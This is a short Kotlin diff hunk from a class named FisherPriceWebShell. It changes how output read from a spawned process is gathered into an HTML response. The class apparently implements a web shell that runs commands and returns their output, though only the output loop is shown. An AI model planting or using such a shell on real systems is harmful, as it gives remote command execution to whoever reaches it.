@@ -23,7 +23,7 @@ class FisherPriceWebShell() {
             val bri = BufferedReader(InputStreamReader(process.inputStream))
             var line: String? = null
             while ({ line = bri.readLine(); line }() != null) {
-                response = line!!
+                response += line!! + "<br/>"
             }
         } catch (e: Exception) {
             "Could not fetch response: " + e.message
